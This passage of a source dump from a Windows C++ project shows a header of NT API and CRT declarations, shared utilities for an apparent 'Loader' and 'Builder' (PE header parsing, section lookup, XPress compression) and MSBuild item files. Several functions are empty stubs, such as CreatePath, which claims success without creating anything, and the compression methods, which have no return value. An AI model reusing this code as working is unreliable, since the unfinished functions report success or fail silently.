#define _NB_SDK 0 // Explicitly disables active components of the SDK as we are inside the core
#include "..\sdk.h"

#pragma region Runtime Library
// No Runtime Library: Provides subroutines for the compiler/dev that emulate the CRT

#ifdef __cplusplus
extern "C" {
#else
{
#endif
	NTSYSAPI NTSTATUS NTAPI RtlDowncaseUnicodeString(
		_Inout_ UNICODE_STRING * DestinationString,
		_In_    UNICODE_STRING * SourceString,
		_In_    BOOLEAN         AllocateDestinationString
	);

	NTSYSAPI NTSTATUS NTAPI RtlCompressBuffer(
		_In_                                                              USHORT CompressionFormatAndEngine,
		_In_reads_bytes_(UncompressedBufferSize)                          PUCHAR UncompressedBuffer,
		_In_                                                              ULONG  UncompressedBufferSize,
		_Out_writes_bytes_to_(CompressedBufferSize, *FinalCompressedSize) PUCHAR CompressedBuffer,
		_In_                                                              ULONG  CompressedBufferSize,
		_In_                                                              ULONG  UncompressedChunkSize,
		_Out_                                                             PULONG FinalCompressedSize,
		_In_                                                              PVOID  WorkSpace
	);
	NTSYSAPI NTSTATUS NTAPI RtlDecompressBufferEx(
		_In_                                                                  USHORT CompressionFormat,
		_Out_writes_bytes_to_(UncompressedBufferSize, *FinalUncompressedSize) PUCHAR UncompressedBuffer,
		_In_                                                                  ULONG  UncompressedBufferSize,
		_In_reads_bytes_(CompressedBufferSize)                                PUCHAR CompressedBuffer,
		_In_                                                                  ULONG  CompressedBufferSize,
		_Out_                                                                 PULONG FinalUncompressedSize,
		_In_opt_                                                              PVOID  WorkSpace
	);
	NTSYSAPI NTSTATUS NTAPI RtlGetCompressionWorkSpaceSize(
		_In_  USHORT CompressionFormatAndEngine,
		_Out_ PULONG CompressBufferWorkSpaceSize,
		_Out_ PULONG CompressFragmentWorkSpaceSize
	);
	NTSYSAPI NTSTATUS NTAPI NtSuspendProcess(
		_In_ LONG ProcessId
	);
	NTSYSAPI ULONG NTAPI RtlRandomEx(
		_Inout_ PULONG Seed
	);

	IMPORT int __cdecl swprintf_s(wchar_t* buffer, size_t sizeOfBuffer, const wchar_t* format, ...);
	IMPORT int __cdecl vswprintf_s(wchar_t* buffer, size_t numberOfElements, const wchar_t* format, va_list argptr);
	IMPORT int __cdecl vsprintf_s(char* buffer, size_t numberOfElements, const char* format, va_list argptr);
	// IMPORT wchar_t* __cdecl wcschr(const wchar_t* str, wchar_t c);

	IMPORT int __cdecl _wtoi(_In_z_ wchar_t const* _String);
	IMPORT int __cdecl atoi(_In_z_ char const* _String);
	IMPORT long __cdecl wcstol(_In_z_ wchar_t const* _String, _Out_opt_ _Deref_post_z_ wchar_t** _EndPtr, _In_ int _Radix);
	IMPORT int __cdecl swscanf_s(_In_z_ wchar_t const* const _Buffer, _In_z_ _Scanf_s_format_string_ wchar_t const* const _Format, ...);
}
#pragma endregion

#ifdef __cplusplus
namespace utl {
	IMAGE_NT_HEADERS*     GetNtHeader(_In_ handle hMod);
	IMAGE_SECTION_HEADER* FindSection(_In_ IMAGE_NT_HEADERS* NtHeader, _In_ const char Name[8]);

	status                CreatePath(_In_z_ const wchar* Path);
}

#if 0
class rc4 {
public:
	~rc4();

	void ksa(_In_ void* Key, _In_range_(1, 256) size_t KeyLength);
	byte prg();

	void crypt(_In_ void* Buffer, _In_ size_t BufferSize, _Out_ void* Output);
	void rc4random(_Out_ void* Buffer, _In_ size_t BufferSize);

private:
	byte m_SBox[256];      // Key'd state
	u8   m_i = 0, m_j = 0; // SBox state
};
#endif
#endif

```

`src/shr/shr.cpp`:

```cpp
// Collection of shared utility functions between the Loader and Builder
#include "nbp.h"

namespace utl {
#pragma region Image
	IMAGE_NT_HEADERS* GetNtHeader(
		_In_ handle Module
	) {
		if (((IMAGE_DOS_HEADER*)Module)->e_magic != IMAGE_DOS_SIGNATURE)
			return nullptr; // Invalid signature

		IMAGE_NT_HEADERS* NtHeader = (IMAGE_NT_HEADERS*)((ptr)Module + ((IMAGE_DOS_HEADER*)Module)->e_lfanew);
		if (NtHeader->Signature != IMAGE_NT_SIGNATURE)
			return nullptr; // Invalid signature
		if (NtHeader->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR_MAGIC)
			return nullptr; // Invalid signature

		return NtHeader;
	}

	IMAGE_SECTION_HEADER* FindSection(
		_In_ IMAGE_NT_HEADERS* NtHeader,
		_In_ const char        Name[8]
	) {
		// Iterate over sections
		IMAGE_SECTION_HEADER* SectionHeader = IMAGE_FIRST_SECTION(NtHeader);
		for (auto i = 0; i < NtHeader->FileHeader.NumberOfSections; i++) {
			if (*(u64*)SectionHeader->Name == *(u64*)Name)
				return SectionHeader;

			SectionHeader++;
		}

		return nullptr;
	}
#pragma endregion

	status CreatePath(           // Creates a directory with all its intermediats
		_In_z_ const wchar* Path // The FilePath to create
	) {


		return SUCCESS;
	}
}

class XPress {
	static constexpr USHORT COMPRESSOR_MODE = 0x0104;
	static constexpr USHORT COMPRESSOR_CHUNCK = 0x1000;

public:
	XPress() {
		u32 v0;
		RtlGetCompressionWorkSpaceSize(COMPRESSOR_MODE, (ULONG*)&m_WorkSpaceSize, (ULONG*)&v0);
		m_WorkSpace = VirtualAlloc(nullptr, m_WorkSpaceSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	}
	~XPress() {
		VirtualFree(m_WorkSpace, 0, MEM_RELEASE);
	}

	status CompressBufferInplace(
		_In_ void* Buffer,
		_In_ size_t Size
	) {

	}

	status DecompressBufferInplace(
		_In_ void* Buffer,
		_In_ size_t Size
	) {

	}

private:
	void* m_WorkSpace;
	u32   m_WorkSpaceSize;
};
```

`src/shr/shr.vcxitems`:

```vcxitems
<?xml version="1.0" encoding="utf-8"?>
<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup Label="Globals">
    <MSBuildAllProjects Condition="'$(MSBuildVersion)' == '' Or '$(MSBuildVersion)' &lt; '16.0'">$(MSBuildAllProjects);$(MSBuildThisFileFullPath)</MSBuildAllProjects>
    <HasSharedItems>true</HasSharedItems>
    <ItemsProjectGuid>{f510336d-e46a-4ea5-9517-6f97f1822457}</ItemsProjectGuid>
    <ItemsProjectName>shr</ItemsProjectName>
  </PropertyGroup>
  <ItemDefinitionGroup>
    <ClCompile>
      <AdditionalIncludeDirectories>%(AdditionalIncludeDirectories);$(MSBuildThisFileDirectory)</AdditionalIncludeDirectories>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ProjectCapability Include="SourceItemsFromImports" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="$(MSBuildThisFileDirectory)nbp.h" />
    <ClInclude Include="$(MSBuildThisFileDirectory)itl.h" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="$(MSBuildThisFileDirectory)shr.cpp" />
  </ItemGroup>
</Project>
```

`src/shr/shr.vcxitems.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <ClInclude Include="$(MSBuildThisFileDirectory)itl.h" />
    <ClInclude Include="$(MSBuildThisFileDirectory)nbp.h" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="$(MSBuildThisFileDirectory)shr.cpp" />
  </ItemGroup>
</Project>
```